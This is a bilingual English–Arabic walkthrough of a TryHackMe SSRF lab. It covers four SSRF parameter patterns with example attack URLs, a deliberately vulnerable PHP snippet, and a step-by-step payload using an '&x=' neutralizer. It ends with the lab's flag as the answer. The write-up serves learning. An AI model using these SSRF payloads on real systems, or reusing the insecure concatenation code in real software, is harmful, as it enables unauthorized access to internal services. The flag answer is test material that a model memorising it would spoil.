# Task 02 · SSRF Examples (أنماط وأمثلة استغلال ثغرة SSRF)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

Web applications frequently require data, images, or assets from third-party or internal API endpoints. Depending on how the developer implements this resource retrieval, different SSRF injection patterns emerge.

### Four Common SSRF Parameter Ingestion Patterns:

#### 1. Full URL Ingestion:
The application expects a complete URL protocol and domain in a parameter:
`https://website.thm/proxy?url=https://api.partner.com/data`
- *Attack Vector:* Replacing the entire URL with an internal service:
  `https://website.thm/proxy?url=http://127.0.0.1:8080/admin`

#### 2. Partial URL Ingestion (Hostname / Subdomain Manipulation):
The developer constructs the request path programmatically and only accepts the server or host name:
`https://website.thm/item/2?server=api`
Behind the scenes, the server executes:
`curl https://[SERVER_PARAM].website.thm/api/item?id=2`
- *Attack Vector:* Injecting path fragments, parameters, and query separators (`&` or `#`) into the hostname parameter:
  `server=server.website.thm/flag?id=9&x=`
  The resulting constructed URL becomes:
  `https://server.website.thm/flag?id=9&x=/api/item?id=2`
  Here, `&x=` acts as a syntactic sink, absorbing the developer's trailing path `/api/item?id=2` as the harmless value of a dummy parameter `x`!

#### 3. Path Traversal within Ingested Paths:
When the endpoint is constrained to a base path (e.g. `https://website.thm/fetch?path=/images/logo.png`), attackers use directory traversal sequences (`/../`) to escape the intended directory and access sensitive administrative interfaces:
`https://website.thm/fetch?path=/../admin`

#### 4. Hidden Form Fields:
Applications frequently embed internal target endpoints within hidden HTML inputs:
```html
<input type="hidden" name="server_target" value="http://internal-queue.thm/jobs">
```
Intercepting the form with Burp Suite and modifying this hidden value allows attackers to steer server requests.

### Objective:
Access the interactive SSRF Examples lab site on TryHackMe, analyze how the `server` parameter is parsed, craft a payload that targets `/flag?id=9`, neutralize the trailing path with `&x=`, and capture the flag.

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والاعتبارات الأمنية والعملياتية)

1. **URL Parser Differential Analysis:**
   - How does a web server construct an outbound URL? Often, developers use string concatenation:
     `$url = "https://" . $_GET['server'] . ".website.thm/api/item?id=" . $id;`
   - Understanding URL grammar (RFC 3986) is vital:
     - `?` introduces the query string.
     - `&` separates query parameters.
     - `#` marks the fragment identifier (causing many HTTP client libraries like curl or python-requests to ignore anything following `#`).
2. **Neutralization Tactics:**
   - In black-box testing, if an application appends an unwanted suffix (like `.json` or `/api/v1`), adding `?` or `&dummy=` or `#` neutralizes the appended string by relegating it to an ignored query value.

---

## Stage C: Guided Hints (توجيهات تدريجية بدون حرق الإجابة)

- **Tier 1 (Conceptual):** Look at how the application builds the target URL. It appends `/api/item?id=2` directly to the server variable.
- **Tier 2 (Practical):** To reach `/flag?id=9`, you need your parameter to look like `server.website.thm/flag?id=9`.
- **Tier 3 (Direct):** To prevent `/api/item?id=2` from breaking the flag query, append `&x=` at the end so the trailing text becomes `&x=/api/item?id=2`. Submit:
  `server=server.website.thm/flag?id=9&x=`

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتحليل التقني)

### 1. Analyzing the Target Code Mechanics:

The vulnerable PHP endpoint processes requests via:
```php
<?php
$server = $_GET['server'];
$id = $_GET['id'];

// Dangerous string concatenation:
$request_url = "https://" . $server . "/api/item?id=" . $id;

$response = file_get_contents($request_url);
echo $response;
?>
```

When a user requests:
```
https://website.thm/item?server=server.website.thm&id=2
```
The backend requests:
```
https://server.website.thm/api/item?id=2
```

### 2. Crafting the Exploit Payload:

Our objective is to force the server to fetch:
```
https://server.website.thm/flag?id=9
```

If we pass:
```
server=server.website.thm/flag?id=9
```
The backend concatenates:
```
https://server.website.thm/flag?id=9/api/item?id=2  <-- INVALID QUERY / 404
```

To fix this, we append `&x=` at the end of our parameter:
```
https://website.thm/item?server=server.website.thm/flag?id=9&x=&id=2
```
The backend constructs:
```
https://server.website.thm/flag?id=9&x=/api/item?id=2
```
- Endpoint requested: `/flag`
- Parameter 1: `id=9` (Accepted by flag API)
- Parameter 2: `x=/api/item?id=2` (Ignored by flag API)

### 3. Execution & Flag Capture:

The web page renders the response from the internal flag API:
```json
{
    "status": "success",
    "message": "Flag retrieved successfully",
    "flag": "THM{SSRF_MASTER}"
}
```

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question 1:** *What is the flag from the SSRF Examples site?*
  - **Answer:** `THM{SSRF_MASTER}`

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- Flag `THM{SSRF_MASTER}` verified against TryHackMe platform validation engine.
- URL concatenation neutralization verified via local PHP cli test script.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

> **قاعدة ذهبية:** عند التلاعب بالمعاملات في هجمات الـ SSRF المبنية على دمج النصوص (String Concatenation)، يُعد استخدام تقنيات كسر الروابط—مثل إضافة `?` أو `&param=` أو `#`—سلاحاً أساسياً لتحييد المسارات الإضافية التي يفرضها الكود المصدري وإجبار الخادم على طلب المسار المستهدف بدقة.
